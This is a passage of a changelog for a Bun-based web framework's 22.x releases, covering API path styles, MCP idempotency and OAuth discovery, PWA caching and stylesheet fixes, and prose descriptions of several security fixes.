  Sorted, `apps/admin/**` ran before it, so a module-level `derivePath('signOut').path` there
  captured the default style's `/api/outs/sign` and a form posted to a URL no route served once the
  app declared `defineApi({ http: { pathStyle: 'readable' } })` (notificado.co, 22.6.0). One scan
  backs `x dev`, `runRole`, `x build`'s prerender, `x manifest`, `x routes` and `x verify`, so all of
  them get the order; an app's test preload already imports the index first.
- **action:** a path handed out by name (`derivePath(name)`, `actionHttpPath('name')`) under one
  style, then moved by a later `pathStyle` declaration, is refused at that declaration with
  `X_ACTION_PATH_DERIVED_EARLY` naming every stale capture — instead of a 404 in production. It
  catches what ordering cannot: a capture inside the api index's own import graph, which evaluates
  before the `defineApi` call. The fix it names: derive where the path is used, not in a
  module-level const. A path the new style does not move (a pin) is not stale.
- **mcp:** `idempotent: true` actions are idempotent over MCP. Their tool advertises one reserved,
  optional argument, `idempotencyKey` (string, 1–255), in `tools/list`; `tools/call` takes it out
  of the arguments and hands it to `invoke` as the key, so a retried call replays the first result
  (`X_IDEMPOTENCY_CONFLICT` for the same key with different arguments), filed under action, caller
  and key exactly as the HTTP `Idempotency-Key` header is. The action's input never sees it;
  non-idempotent tools do not advertise it and refuse it (`X_MCP_ARGS_INVALID`). An argument rather
  than `params._meta`: model-driven clients cannot set `_meta`. An idempotent action whose input
  already declares `idempotencyKey` is `X_MCP_IDEMPOTENCY_KEY_SHADOWED` at boot. New export
  `MCP_IDEMPOTENCY_KEY_ARG`.

### Commits

- fix: API declaration loads first; early-derived path refusal; idempotency keys over MCP (#561)

## 22.6.0 - 2026-09-27

### Added

- **core, action, cli:** `defineApi({ http: { pathStyle: 'readable' } })` — an action's URL is its
  kebab-cased export name (`signIn` → `/api/sign-in`, `health` → `/api/health`,
  `viewCustomer360` → `/api/view-customer360`) instead of the guessed plural resource
  (`/api/ins/sign`). The default stays `'resource'`: no app's URLs move until it opts in. Under
  `'readable'` the OpenAPI tag is the resource the policy names (`can('cases:create')` → `cases`).
  `action({ http: { path: '/api/webhooks/wompi' } })` (and on `mutator()`) pins one action's URL
  whatever the style — for paths a vendor holds. The typed client takes the style:
  `rpc({ baseUrl, pathStyle: 'readable' })`; `action.client()` honours a pin. `derivePath(name)` is
  now style- and pin-aware; new `actionHttpPath`, `configureActionPathStyle`, `actionPathStyle`,
  core `actionRoute(name, style)` / `actionPath(name, style)`, `ActionPathStyle`,
  `ACTION_PATH_STYLES`, `ACTION_PATH_PREFIX`. New codes `X_ACTION_HTTP_PATH_INVALID`,
  `X_ACTION_PATH_STYLE_INVALID`.
- **action, cli:** `defineApi({ openapi: { title, version, description, servers, sessionCookie } })`
  opts `openapi.json` into the complete document: the app's `info` and `servers`,
  `components.securitySchemes` (`cookie`; `bearer` when a mount exists), and `401` + `429` (with
  `Retry-After`) Problem responses on every operation whose route authenticates, `RateLimit-*`
  headers on rate-limited ones. Without the block the bytes are unchanged. `completeOpenApi`,
  `mountOpenApi`, `apiDeclaration`. New code `X_OPENAPI_CONFIG_INVALID`.
- **http, action, cli:** bearer mounts — `defineApi({ http: { mounts: [{ prefix: '/v1', scopes,
  resolveToken, rateLimit, openapi: 'openapi.v1.json' }] } })` serves a cut of the same routes at
  `/v1/*` (`/api/create-case` → `/v1/create-case`, `/_x/query/case-list` → `GET /v1/case-list`).
  Only `Authorization: Bearer` authenticates there — a session cookie reaches nothing, so no CSRF
  proof is needed; no or unresolved token is 401 with `WWW-Authenticate`; a primitive outside the
  token's scopes is 404 like MCP's unknown tool; a per-token allowance answers `RateLimit-*` and
  429 + `Retry-After`. `scopes`/`resolveToken` take exactly what `defineAppMcp` takes. `x manifest`
  writes the mount's own document and `x verify` refuses it stale or missing. `@ultimat3/http`:
  `bearerMount`, `bearerTokenOf`, `mountedPath`, `RouteMeta.authenticate` (a route's own
  authenticator REPLACES the app's), `selfOrigin` exported. New code `X_BEARER_MOUNT_INVALID`.
- **mcp, cli:** `defineAppMcp({ oauth: { authorizationServers, resource?, scopesSupported?,
  resourceName?, resourceDocumentation? } })` — MCP authorization-spec discovery (RFC 9728): every
  401 carries `WWW-Authenticate: Bearer realm="ultimate-mcp", resource_metadata="<origin>/.well-known/oauth-protected-resource/mcp"`
  (`error="invalid_token"` when a token was sent), and both boots serve the metadata at that
  path-inserted URL and at the root. The origin is the pipeline's public one (`ctx.https`).
  `McpRouteDescriptor.protectedResource`, `handle(request, { origin })`. New code
  `X_MCP_OAUTH_INVALID`.
- **cli:** `apps/<app>/runtime.ts` → `runtime.routes` — plain HTTP routes at paths no primitive
  projects to (`/.well-known/oauth-authorization-server`, a form-encoded `POST /oauth/token`
  answering RFC 6749 JSON), mounted by `x dev` and the container through the whole pipeline.
- **render, action, cli:** `defineRoute({ render: 'ssr', …, post: '<actionExportName>' })` binds
  `POST` at the page's own URL to that action, the URL's query merged over the posted fields
  (query wins) — an RFC 8058 one-click `POST /baja?t=…` with `List-Unsubscribe=One-Click` works
  anonymously while `GET` stays the confirm page. `toPostBinding(action, path)`. New code
  `X_ROUTE_POST_INVALID` (not an export name, on a `static` page, or — at boot — no such action).
- **http:** `configureHttp({ security: { hsts: { preload: true } } })` — `hsts` now merges key by
  key over the two-year default; `null` still sends none.
- **core:** `Span.updateName(name)`.

### Changed

- **http:** CSP `connect-src` is `'self' blob:` — the bare `ws:`/`wss:` schemes (a socket to any
  host) are gone. Same-origin realtime is covered by `'self'` (CSP Level 3); the boot adds a
  cross-origin `SYNC_URL`'s origin exactly.
- **mail:** one-click unsubscribe is documented as the supported path — one url for header and
  footer, a page whose `GET` confirms and whose `POST` (`defineRoute({ post })`) unsubscribes;
  `unsubscribeOneClick: false` is the fallback.

### Security

- **http:** the request span was named `GET /r/<token>` and carried the concrete path in
  `http.route`, exporting every capability token in a URL to the trace collector. The span is now
  named by the route PATTERN (`GET /r/:token`, or the bare method when nothing matched) and
  `http.route` is the pattern or `unmatched`.
- **mcp:** a 401 for a token that did not resolve now says `error="invalid_token"` (RFC 6750).

### Commits

- feat(action,http,mcp,render): readable API paths, complete OpenAPI, Bearer mounts, MCP OAuth discovery, page POST binding, route-named spans (#559)

## 22.5.1 - 2026-09-27

### Security

- **action, core:** the idempotency record's `requestHash` (the `x_idempotency.request_hash`
  column, kept for the 24 h window) was a 64-bit UNKEYED SHA-256 prefix of the whole action input,
  so a low-entropy secret in an input (a bank account number, an ID number) with the other fields
  known was brute-forceable offline from a database read. It is now
  `keyedFingerprint(input, purpose)` — `h1:<key id>:<HMAC-SHA-256, 128 bits>` under a key derived
  from the existing `ULTIMATE_CURSOR_SECRET` (production boot already refuses the dev key). No new
  env var, no migration. Rows written by an earlier build are still compared exactly until they
  expire; a row keyed under a rotated-away secret replays on its status (never re-runs, never a
  false 409) and logs `action.idempotency.fingerprint-unverifiable`. New in core:
  `keyedFingerprint`, `compareFingerprint`, `KEYED_FINGERPRINT_VERSION`, type `FingerprintMatch`.

### Commits

- fix(action,core): key the persisted idempotency fingerprint — HMAC, not a bare SHA-256 prefix (#557)

## 22.5.0 - 2026-09-27

### Added

- **core, http, realtime, cli:** `health: { readiness: 'process' }` in `app.config.ts` (default
  `'dependencies'`, unchanged). In `'process'` mode `/readyz` is 503 only while starting, draining or
  stopped; a failing readiness check stays 200 and is still reported by name in `checks`, so one
  database blip no longer pulls every replica out of the ingress at once. `/readyz?deep=1` always
  answers on the dependencies, for monitoring. `configureLifecycle({ readiness })`,
  `readyzPayload({ deep })`, types `HealthConfig`, `ReadinessMode`, `READINESS_MODES`.

### Fixed

- **release:** the publish step runs one `npm publish` per package, and a package npm reports as
  `previously staged` by an earlier attempt of the same release is a notice, not a failure. npm now
  stages a publish before `npm view` can see it, so v22.4.0's resumed runs died `E409` on packages
  the previous attempt had already published, and a mid-tier `E401` lost the rest of its tier.

### Commits

- feat(core,http,realtime,cli): health.readiness 'process' — a dependency blip no longer empties the ingress (#555)
- fix(release): publish one package per npm call; a staged version is not a failure (#554)

## 22.4.0 - 2026-09-27

### Added

- **mcp:** `defineAppMcp({ surface, groups })` — a constant MCP surface. `surface: 'meta'` (or a
  per-caller `(caller) => 'meta' | 'flat'`) serves `list_resources`, `describe_resource` (batched)
  and `manage_resource` in place of one tool per grouped primitive; ungrouped tools stay flat. The
  meta dispatcher runs the flat call's own resolve → policy → audit path, so answers are
  byte-identical, a hidden tool is ToolNotFound through either door, and `manage_resource` is
  metered as the tool it reaches. Default `'flat'`: nothing changes. `McpTool.confirms` marks a
  write a human finishes. New codes `X_MCP_GROUP_UNKNOWN`, `X_MCP_GROUP_CONFLICT`,
  `X_MCP_SURFACE_INVALID`.
- **mcp, query:** `listParams` on a query's `mcp` block (`QueryListParams`) and on `McpTool` —
  a whitelist of flat filter keys (`status_eq`, `_in`, `_gt`, `_lt`, `_cont`), `sort`, `fields`,
  keyset `cursor` + `limit`, published by `describe_resource` and enforced by `manage_resource`;
  a key the query input does not declare is `X_MCP_LIST_PARAMS_INVALID` at boot.
- **mail:** `setMailTransform(fn)` — an app-level outbound hook run once per `send()` after render
  and before the idempotency key, so the queue row and every retry carry the transformed bytes. A
  throw fails the send with `X_MAIL_TRANSFORM_FAILED`; nothing is sent untransformed.

### Fixed

- **cli:** `x dev` now hands the app's `apps/<app>/runtime.ts` overrides to `startServices`, as the
  container boot (`withAppRuntime`) always did — so `storage` (and `jobs`, `mail`, …) are the ones
  development runs. It built its own embedded disk before, so an app's `/_storage` routes and its
  actions wrote to two places in `x dev` and to one in production.
- **cli:** `x g route <path>` takes a URL path — `x g route casos/[id]/notificar` writes
  `apps/web/app/casos/[id]/notificar/page.tsx`. Each segment is a word or `[param]`/`[...rest]`;
  `..`, `.` and empty segments stay `X_CLI_BAD_FLAG`. It refused any `/` before, so a nested page
  was generated flat and moved by hand.
- **cli:** a PWA screenshot or shortcut-icon `src` under `/assets/` resolves to its content-hashed
  URL, as `asset()` does in a page; a missing file is `X_ASSET_MISSING` at boot. The manifest took
  `src` verbatim while the site serves an asset only at its hashed URL, so an app had to hash its
  own screenshots or ship a 404 in the install sheet.

### Commits

- fix(cli): x dev honours the app runtime disks; x g route takes a path; PWA asset srcs hashed (#552)
- feat(mcp,mail): meta MCP surface with list params; outbound mail transform hook (#551)

## 22.3.6 - 2026-09-26

### Fixed

- **testing, cli:** `x test` held every finished test file in memory. Bun 1.4.0 never frees a
  file's global object under `--isolate` (implied by `--parallel`) while any `Bun.plugin` handler is
  registered, and the framework registers two per file (the registry leak guard, render's loader):
  on notificado.co each of 18 workers climbed to 2.1–2.3 GB, ~30 GB total. `x test` now sets
  `ULTIMATE_TEST_ISOLATED=1` on every isolated child (not with `-- --no-isolate`), and the testing
  preload runs `Bun.plugin.clearAll()` after each file then (`releasePluginsAfterIsolatedFile`);
  the next file's preload registers them again. Measured there: per-worker peak 1.0–1.5 GB, 18 GB
  total. Never in a shared run, where render's loader would not re-register.

### Commits

- fix(testing,cli): free each finished file in isolated test runs (#549)

## 22.3.5 - 2026-09-26

### Fixed

- **render:** 22.3.4 still minted a different `/styles/<hash>.css` on every boot of one image
  (notificado.co: two pods, `acb0b5fb` vs `ae42d479` for `/`, each the other's 404). The two bodies
  were the same bytes in a different order — `@ultimat3/ui`'s AppShell and Avatar sheets swapped.
  A `.scss` registers in Bun's `onLoad`, which runs as the loader FETCHES a module's dependencies,
  in parallel, so arrival order was a race; sorting the imports (22.3.4) could not order it.
  `stylesFor` now orders by the sheets alone (`stylesheetOrder`): the global layer, then package
  sheets, then `shared/`, then the surface's own, each by app-root-relative path. Reproduced with
  two real boots of the app (4 of 4 differing before, 4 of 4 identical after), and pinned by a test
  that boots the reference app in three processes.

### Commits

- fix(render): order surface stylesheets by the sheets, never by arrival (#547)

## 22.3.4 - 2026-09-26

### Fixed

- **cli, render:** two pods of one image served two different `/styles/<hash>.css` for one page
  (notificado.co, 22.3.2), so a page's stylesheet 404ed on whichever pod had not minted it. Three
  causes. `loadApp` imported the app in `Bun.Glob` order — directory order, which ext4 hashes with a
  per-filesystem seed — and import order is stylesheet order; it now imports sorted within each
  glob. An island build loads its sheets in parallel, so their arrival order was a race; island-only
  sheets are now ordered by path after the server graph's (`loadStylesheet(path, source, 'island')`).
  And a container serving the stored islands never registered an island's own stylesheet at all;
  the island store now records them and the boot registers them. A process also keeps serving every
  stylesheet it minted (the last 32), so a late import cannot 404 a URL a document already names.
- **pwa:** one precache entry answering 404 failed the install on every deploy (`addAll` is
  all-or-nothing), so every visitor stayed on the first worker that ever installed, serving pages
  that named assets gone from the server, until Shift+F5. Each entry is now fetched and stored on
  its own; a failed entry costs its offline copy only, and the new worker installs, skips waiting,
  claims the tabs and posts `AppUpdateAvailable`.
- **cli:** a miss on a content-hashed URL (`/styles/*`, `/islands/*`) is `no-store`. It was
  `public, max-age=0, s-maxage=60, stale-while-revalidate=600`, which let a CDN pin the 404.

### Commits

- fix(cli,render,pwa): one stylesheet per image across pods, resilient SW install, no-store asset misses (#545)

## 22.3.3 - 2026-09-26

### Security

- **pwa:** a page rendered for someone is never cached. From 21.0.0 a `private`/`no-store`
  document was kept in a per-member partition for offline, so after sign-out an offline navigation
  on a shared device showed the previous member's data (notificado.co, `/casos`). Now every cache
  the worker opens refuses a response that is `private`/`no-store` or carries `x-ultimate-scope`,
  whatever the rule; a PERSONAL route — a `policy`, a `stream`, or `cache: 'no-store'` /
  `{ mode: 'no-store' | 'private' }` (new `RouteDescriptor.personal`) — is `network-only` and never
  precached. New message `{ type: 'clear-pages' }` (`CLEAR_PAGES_MESSAGE`) empties every build's
  pages cache and answers `{ type: 'pages-cleared' }`; post it on sign-out.
  An offline-first app opts back into 21.0.0's per-member offline copy with
  `pwa.offline.personalPages: 'last-member'` (`examples/dummy` does); the default is `'never'`.

### Fixed

- **pwa, cli:** the install precached EVERY island chunk (~1 MB on notificado.co, admin and payment
  islands included) on a first anonymous visit. The precache now names only the chunks a precached
  page or the offline document boots — read from the rendered documents in a static export, from
  each route's declared `island()`s at boot (new `RouteDescriptor.islandSources`). Every other chunk
  is cached on first use: `/islands/` is a `cache-first` runtime rule (`runtimeAssets`).
- **pwa, cli:** no `/en/…` URL had a worker rule, so a non-default locale was never cached or
  offline. The worker gets every route once per routed locale, each precached at its own content
  hash, and an offline navigation under `/en/` gets `/en/offline` (`localePrefixes`).
- **cli, core:** the manifest said `lang: "en"` for an `es-co` app, and there was one for both
  locales. Now one per routed locale — `/manifest.webmanifest` for the default,
  `/en/manifest.webmanifest` (`start_url: '/en/'`) for `en` — sharing one `id` (`pwa.id`, default
  `/`), each document linking its own. New optional `pwa.description`, `pwa.categories`,
  `pwa.shortcuts`, `pwa.screenshots`; text is a string or one per locale.

### Commits

- fix(pwa,cli,core,render): personal pages never cached, precache only precached pages' islands, per-locale rules and manifests (#543)

## 22.3.2 - 2026-09-26

### Fixed

- **pwa:** a deploy reached a returning visitor only after Shift+F5 (measured on notificado.co,
  22.3.1). Two causes, both in the generated `sw.js`. Every document rule is now `network-first`:
  `MODE_STRATEGY` mapped `static` to `cache-first` and `isr`/`stream` to `stale-while-revalidate`,
  so an online navigation was answered with the HTML the old worker held — naming the old deploy's
  hashed CSS and islands. The precached / pages-cached copy is now the OFFLINE answer only;
  `offline: 'precache'` still precaches, and a per-route `strategy` still overrides. And the new
  worker calls `self.skipWaiting()` in `install`: nothing ever posted `skip-waiting`, so a new
  worker waited until every tab of the origin closed. It never reloads a page — the open tab gets
  `AppUpdateAvailable`, and its next navigation is the new HTML. A browser still on a 22.3.1
  worker converges with no user action: its next navigation fetches the new `sw.js`, which takes
  over at once; that navigation is the last one answered from the old cache.
- **cli:** `x-sw-register.js` calls `registration.update()` when a hidden tab becomes visible, at
  most once per five minutes, so a tab left open for days finds the new worker before its next
  click. It never posts `skip-waiting` and never reloads.
- **cli:** `immutable` only for a content-hashed URL. `/x-sw-register.js` (was
  `public, max-age=3600`) and the `/icons/*` matrix (was `public, max-age=31536000, immutable`,
  under names that are sizes, not bytes — a replaced `icon.png` never reached a client that had
  seen the old one) answer `public, max-age=0, must-revalidate` with a strong ETag, and 304 when it
  matches `If-None-Match`.
- **ui:** the reset is zero-specificity. `a:hover` is (0,1,1), so it beat any single class on a
  link: `<a class="primary">` — a filled button link — showed accent-strong text on its
  accent-strong hover background, i.e. no text. Every rule a component may restyle is now inside
  `:where(…)` whole (`:where(a:hover)`, since `:where(a):hover` is still (0,1,0)), including the
  focus ring, `:target`, headings, form controls, `hr` and `table`. Left specific on purpose: the
  modal scroll lock, the live-region class, the reduced-motion guard, and `::selection` (a
  pseudo-element is invalid inside `:where()`). An app rule on a bare element (`a { … }`) now beats
  the reset whatever the stylesheet order.

### Commits

- fix(pwa,cli,ui): network-first documents, worker skips waiting, revalidated register/icons, zero-specificity reset (#540)

## 22.3.1 - 2026-09-26

### Added

- **mail:** `send(…, { unsubscribeUrl, unsubscribeOneClick: false })` keeps the GET-only
  `List-Unsubscribe` header and drops `List-Unsubscribe-Post: List-Unsubscribe=One-Click`, for an
  unsubscribe URL that is a confirm page and cannot honour RFC 8058's one-click POST. Default
  `true`: every existing send, and its idempotency key, is unchanged. The header gate still covers
  the URL. The `mail.send` job's input gained the optional field, so an app that sends mail sees
  `X_MANIFEST_BREAKING` on `jobs.mail.send.input` in `contract-diff` until it re-commits its
  baseline with `x manifest`. A queued payload from before the upgrade still parses.
- **cli:** `x shot --expect-status <n>` — the document status a shot is ok with, for photographing
  a not-found page on purpose. `verdict.json` carries `status` and `expectedStatus`.

### Changed

- **render:** stylesheet compiles are cached on disk under `.x/cache/sass/`, keyed by the Sass
  version, the file and its source, and valid only while every file the compile read (partials,
  `@ultimat3/ui/tokens`) hashes the same. Every `.module.scss` re-parsed the token package on each
  load: on notificado.co (144 sheets) that was 4.8 s wall / 11 s CPU of every app load. A warm load
  compiles nothing and never evaluates Sass (0.27 s). `x manifest --check` on the demo app: 4.2 s →
  1.3 s. The same load serves `x build`, then `x verify`, then `x dev`. An unwritable directory
  costs only the cache (#537).
- **cli:** inside `x verify`, a parallel suite that runs beside the static steps (`live`, `job`,
  `e2e`, `eval`) now defaults to one worker per core (`sharedWorkers()`, still memory-bounded)
  instead of 1.5×. The static steps are CPU-bound processes of their own, and the extra half
  doubled their time (#537). `unit` and `contract` run alone and keep 1.5×. `--workers` still
  overrides both.

### Fixed

- **render:** `:global(html[data-theme='light'])` in a CSS module compiled to
  `html[data-theme=\u00000\u0000]` — shown as `html[data-theme=0]` — so the rule matched nothing.
  A quoted string inside a `:global()` was masked twice and restored once. Both quote styles now
  round-trip byte for byte.
- **cli:** `x shot` reported a 404 page as ok. A document that answers anything but 2xx now fails
  the verdict, and the summary names the status (`--expect-status` for the page you mean to
  photograph). Subresource failures are still counted and still don't gate. `--matrix` marks the
  cell failed.

### Commits

- fix(mail,cli,render): GET-only List-Unsubscribe, Sass cache for manifest, :global() quotes, x shot fails on 404 (#538)

## 22.3.0 - 2026-09-25

### Added

- **render, cli:** public site assets. Files under `apps/web/site/assets/**` (avif, webp, png,
  jpg, gif, svg, ico, woff2, mp4, webm, vtt) are named with `asset('assets/x.avif')` from
  `@ultimat3/render`, which returns a content-hashed URL (`/assets/x.3f2a1b9c.avif`). `x dev` and
  the container serve it `public, max-age=31536000, immutable` with the right content type and
  byte-range support. `writeSiteAssets()` copies every asset into the static export under the same
  name. The path is typed (`AssetPath`), and a missing file fails the render with the new
  `X_ASSET_MISSING`, so `x build --target static` fails on it. See
  [Static Assets](https://github.com/developerz-ai/ultimate/wiki/Static-Assets).
- **ui:** `<Image sources={{ avif, webp }}>` renders a `<picture>` with AVIF, then WebP, then the
  `<img>`. `priority` is `fetchpriority="high"` and never lazy.
- **cli:** `x shot --locale <l>` sends `Accept-Language: <l>` and opens `/<l>/…` for a non-default
  locale. `x shot --matrix` photographs every site route × locale × light/dark × 390/1440 px into
  `.x/shot/matrix/`, with an `index.html` contact sheet.
- **cli:** `x verify --only typecheck,lint,boundaries` runs several steps in one process, in gate
  order. It is still `NOT A GATE RUN`. An unknown or empty item is `X_CLI_BAD_FLAG`, which names
  every valid step.
- **cli:** `x test --filter a/,b/` keeps files matching any of the listed substrings, in one run. An
  empty item is refused, because an empty substring matches every file.
- **cli:** with `x test --allow-empty`, a selection that matches no test file exits 0, spawns
  nothing and says so (`data.files: 0`, `data.empty: true`). Without the flag it is still
  `X_TEST_NO_FILES`.
- **cli:** the `errors` step accepts a repo script as the command in a `fix:` line (`bin/check
  --full`, `./bin/probe`), even when the line has a banned word such as "check".
- **http, i18n:** locale prefix routing. A leading `/<locale>/` for a routed non-default locale
  is stripped before the route table is matched and sets `ctx.locale`, over `?locale=`, the
  cookie, the user and `Accept-Language`. `/fr/x` for an unrouted `fr` is still a 404, and
  `/<default>/x` is a `301` to `/x` (`308` for a non-GET). New `RouteMeta.localeSource`
  (`'path' | 'request'`) and `RequestContext.pathLocale`. `@ultimat3/i18n` adds `routedLocales()`,
  `localizedPath(path, locale)`, `splitLocalePrefix()` and `unlocalizedPath()`; `@ultimat3/core`
  adds the same arithmetic over an explicit list (`localizePath`, `splitLocalePath`) for browser
  code.
- **cli:** `x build --target static` prerenders each `site/` page once per routed locale:
  `index.html` in the default locale, `en/index.html` for `en`, each with its own `<html lang>`.
  `PrerenderedPage.locale`, `PrerenderReport.origin` and `PrerenderReport.warnings` are new.
- **render, seo:** `meta` receives `locale`, `localizedPath(locale)` and `alternates`. The head
  carries the full hreflang cluster in BCP 47 region form (`es-CO`) plus `x-default`, and
  `og:locale` / `og:locale:alternate` (`es_CO`), with no route code. A route's own `alternates`
  still replace the set. New `hreflangTag()`, `ogLocaleTag()` and `localizedAlternates()`.
- **core, cli, seo:** `site.origin` and `seo.robots.disallow` in `app.config.ts`. Canonical,
  `og:url`, hreflang and the sitemap are absolute against `APP_URL`, then `SITE_ORIGIN`, then
  `site.origin`. A production static build with none of them warns on stderr. The disallow paths
  go into the production `robots.txt`; any other environment still disallows everything.
  `loadSiteSettings(root)` and `publicOrigin(env, site)` are exported from `@ultimat3/cli`, and
  `siteSeo` takes `disallow`.
- **cli, seo:** the sitemap lists every page once per locale, each with `xhtml:link` alternates in
  BCP 47 form.
- **ui:** `<LocaleSwitcher path={pathname}>` links each locale to the same page through
  `localizePath`, unprefixed for the default. `hrefFor` still overrides it.

### Changed

- **ui:** `<Image>` needs a reserved box: `width` + `height`, or `aspectRatio` (`'16 / 9'`). An
  image with neither is `X_UI_INVALID_VALUE`, because it shifts the layout when it decodes.
- **cli, testing:** `x shot` and the e2e harness pin `Accept-Language` to the app's
  `defaultLocale`. A capture or an e2e page no longer depends on the language of the machine's
  Chrome.
- **cli:** the default test width is `ceil(cpus × 1.5)`, bounded by free memory at 1 GiB per
  worker. The fixed ceiling of 8 is gone: a 12-core box now defaults to 18. `--workers` accepts up
  to 64.
- **cli:** in `x verify --only … --json`, `data.only` is always a list (`["lint"]`), even for one
  step.
- **http, cli:** a `site/` route takes its locale from its URL alone. The unprefixed path is
  always `defaultLocale`, with no `Accept-Language` negotiation, and `Vary` drops
  `accept-language`. Before, `x dev` and the container answered `/` in the browser's language
  while the static export served the default. `app/` routes still resolve in the order
  `query → cookie → user → header`.
- **cli:** canonical and `og:url` are absolute. Before, they were the bare path.
- **cli:** in a static export, `siteSeo`'s `pagesFor` may list the prefixed copies (`/en/blog/a`).
  They are read back unprefixed, so the sitemap never lists them twice.

### Fixed

- **ui:** `<ThemeToggle mode="select" initial="dark">` shows "system" until the visitor has
  stored a choice. Before, it showed the booted theme as though the visitor had chosen it.
- **cli:** the static export renders in the app's default locale. `createContext()` defaulted it
  to core's `en`, so a site whose default was Spanish shipped `index.html` as `lang="en"`.
- **render:** repeated `og:locale:alternate` and `article:tag` meta tags survive the head dedupe.
  Before, only the last one was kept.

### Commits

- feat(http,render,seo,cli,ui): /<locale>/ prefix routing, per-locale prerender, hashed site assets, faster gate (#535)

## 22.2.2 - 2026-09-25

### Added

- **cli:** the web role serves `GET /robots.txt` and `GET /sitemap.xml` in `x dev` and in
  `runRole`. Until now only the static export wrote them: a `ROLE=web` container answered 404 for
  both, and an app has no way to add a non-page GET route. Both come from the new `siteSeo()`
  (exported from `@ultimat3/cli`): the public `site/` routes (no `policy`), minus any page whose
  `meta` says `robots: { index: false }`, dynamic routes expanded through `prerender()`. URLs are
  absolute against `APP_URL`, else `SITE_ORIGIN`, else the request's origin. Production allows the
  crawl and names the absolute sitemap; anything else is `Disallow: /`. The scaffolded
  `apps/web/prerender.ts` now writes `siteSeo()`'s files, so the export and the process serve the
  same two files. An app scaffolded earlier keeps its own `writeSeoFiles`; replace its body with
  `siteSeo({ baseUrl, pagesFor })` to match. Past 50,000 URLs the web role serves the index but
  not the `/sitemap-N.xml` parts.

### Fixed

- **cli:** with `realtime: { enabled: false }`, documents no longer carry
  `<meta name="ultimate-sync">`, the sync-worker meta or the page-boot script, and the worker and
  boot routes are not mounted. No sync node is started in that case, so the page runtime was handed
  a target nothing served.
- **cli:** `x g job` / `x g task` no longer corrupt `apps/web/api/index.ts` when its `jobs:` or
  `tasks:` list is already one entry per line, which is the shape the generator itself writes once
  a list passes 100 columns. The rewrite nested a second `jobs: [` inside the first and left the old
  `]` behind. Lists are now also searched only inside the `defineApi({` call.
- **admin:** the `/_x` dev dashboard renders its tabs and questions in the framework's own locale.
  In an app whose default locale is not `en`, every tab read `⟦dev.panel.mail.title⟧`. The
  framework catalog is registered under `en` only, and the shell translated through the app's
  ambient locale.
- **render:** `setStylesheetRoot` resolves a relative root, so `loadApp('.')` from `/app` classifies
  sheets correctly. Found in review of #528.

### Commits

- fix(render): resolve a relative stylesheet root before comparing it (#532)
- fix(cli,admin): runtime robots.txt + sitemap.xml, no sync meta when realtime is off, api index edit, /_x locale (#530)

## 22.2.1 - 2026-09-25

### Fixed

- **render / cli:** a stylesheet's surface is read below the app root, never off its absolute path.
  Under the scaffold container's `WORKDIR /app` every absolute path starts with an `app/` segment,
  so every sheet — `site/` modules, `shared/global.scss`, `@ultimat3/ui`'s — classified as `app`,
  `stylesFor('site')` was empty, and every prerendered and `site/` document shipped with no
  `<link rel="stylesheet">`. The same held for any root with `site/`, `api/` or `shared/` above it.
  `loadApp(root)` now names the root before it imports a module (`setStylesheetRoot`, new in
  `@ultimat3/render/server`; the working directory when unset), sheets registered earlier are
  reclassified, and a sheet under `node_modules/` is a package sheet whatever its directories are
  called. Route and boundary classification already read root-relative paths and are unchanged.

### Commits

- fix(render): classify stylesheet surfaces below the app root, not off the absolute path (#528)

## 22.2.0 - 2026-09-24

### Added

- **storage / cli:** the signed-upload `PUT /_storage/:disk/*key` is mounted beside the GET, in `x dev`
  and in `runRole` (#523). A `grantUpload` URL is now PUT-able against the running app and answers
  `201 { key }`. Authenticated, tenant-checked on the verified key, and validated against what the
  grant SIGNED (type and `maxBytes`), not `uploadPolicy()`'s image-only default; the signed
  `maxBytes` — never `bodyLimitBytes` — caps how much of the body is read. New in
  `@ultimat3/storage`: `signedUploadConstraints(input)`, the verified constraints of a PUT before its
  bytes are read.
- **storage:** `definedStorage(): Storage | undefined` — the process's one registry, or `undefined`
  before any `defineStorage`.
- **http:** the exact request body bytes (plan 102, slice 05, in part). `UltimateRequest#bodyBytes()` and,
  for an action handler, `useRequestBodyBytes()` from `@ultimat3/http` — the size-capped, cached
  bytes `bodyRaw()` parses, so reading both costs one read. For a signature over the raw body
  (Amazon SNS posts `text/plain`, a payment gateway signs a header over the bytes), which a decode to
  a string could rewrite.
- **render:** `defineRoute({ cache: 'no-store' | CacheHint })` on `render: 'ssr'` (#525). Replaces
  the ungated default `public, s-maxage=30, stale-while-revalidate=300`; `'no-store'` is
  `private, no-store`. `tags` is not accepted. Refused (`X_ROUTE_MODE_INVALID`) on any other mode, and
  on a gated route that would offer its document to a shared cache (`public`/`immutable`). The
  pipeline still turns a `public` answer private for a signed-in actor. `RouteCache` is exported.

### Fixed

- **render / cli:** `setRedirect(location, status)` from a route's `load` answers a real 3xx on the
  page path (#525), before any document is rendered. `private, no-store` unless the route declares a
  `cache`. `withStatus` still refuses a 3xx.
- **cli:** `/_storage` and `/media` serve the APP's disks (#524). They read the process's one storage
  registry per request — the last `defineStorage()`, which is the app's whenever an app module
  declares its disks — and fall back to the boot's env-selected disk only when nothing did. Before,
  every URL an app-declared disk signed answered 404.
- **cli:** `x verify`'s `policy` step reports `X_PERMISSION_UNKNOWN` for `storage:read` when an app
  declares its own disks and not that permission (#524). Before, this was a `500` on the first
  signed URL.
- **db:** the destructive-migration rail no longer calls `create trigger … before truncate …` or
  `grant`/`revoke … truncate …` a truncate (#522). Only a statement that starts with `TRUNCATE` is one.

### Commits

- fix: signed-upload PUT, app-declared disks, route cache + load redirect, raw body bytes, truncate classifier (#526)
- docs(plans): 101 slice 19 done (#521)

## 22.1.0 - 2026-09-24

### Changed

- **realtime:** the replicator's Postgres connection follows libpq's `sslmode` — `allow`/`prefer`/`require`
  encrypt without verifying, `verify-ca`/`verify-full` verify, `sslrootcert=<file>|system` names the
  trust anchor; a TLS failure is `X_REPLICATION_TLS`. Fixes `prefer` failing against every private-CA
  server (CNPG) and a hang reading the stream after the TLS upgrade (the plain socket kept feeding
  ciphertext to the reader).
- **realtime:** `X_LIVE_REPLICA_IDENTITY` names only tables with no replica identity (`NOTHING`, or
  `DEFAULT` without a primary key), whose UPDATE/DELETE Postgres refuses once published. A keyed table
  on `DEFAULT` is correct for live queries — the shared window decides, proved on real WAL
  (`pg-identity-window.live.test.ts`) — and is no longer warned about on every boot.
- **core:** a declared counter with no samples exports `0`, so `channel_frames_dropped_total` and
  `channel_replay_gaps_total` exist from boot and `rate()` / `absent()` alerts work.
- **realtime:** the replicator ensures its publication at boot — `CREATE PUBLICATION <name> FOR TABLE
